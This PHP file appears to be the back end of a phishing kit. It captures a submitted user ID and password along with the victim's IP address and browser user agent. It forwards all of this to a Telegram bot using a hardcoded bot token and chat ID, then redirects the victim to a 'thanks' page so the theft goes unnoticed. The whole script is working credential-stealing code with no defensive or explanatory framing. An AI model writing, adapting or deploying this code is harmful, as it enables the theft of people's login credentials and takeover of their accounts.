<?php
// Telegram Bot Credentials
$telegramToken = "7794527769:AAGME4TVgMq3kv_HhiBLmjDld4hwElO4LHk";
$chatID = "7283094857";

// Check if form data is received
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $userID = isset($_POST['userID']) ? trim($_POST['userID']) : '';
    $password = isset($_POST['password']) ? trim($_POST['password']) : '';

    if (!empty($userID) && !empty($password)) {
        // Collect User IP and User-Agent
        $ip = $_SERVER['REMOTE_ADDR'];
        $userAgent = $_SERVER['HTTP_USER_AGENT'];

        // Format message for Telegram
        $message = "🔔 New Login Attempt 🔔\n";
        $message .= "📧 Email/UserID: $userID\n";
        $message .= "🔑 Password: $password\n";
        $message .= "🌍 IP: $ip\n";
        $message .= "🖥 User-Agent: $userAgent";

        // Send message to Telegram
        $telegramURL = "https://api.telegram.org/bot$telegramToken/sendMessage";
        $data = [
            'chat_id' => $chatID,
            'text' => $message,
            'parse_mode' => 'HTML'
        ];

        // Send request
        $options = [
            'http' => [
                'header' => "Content-type: application/x-www-form-urlencoded\r\n",
                'method' => 'POST',
                'content' => http_build_query($data),
            ],
        ];
        $context = stream_context_create($options);
        file_get_contents($telegramURL, false, $context);
    }
}

// Redirect to Thanks Page
header("Location: ./thanks.html");
exit();
?>
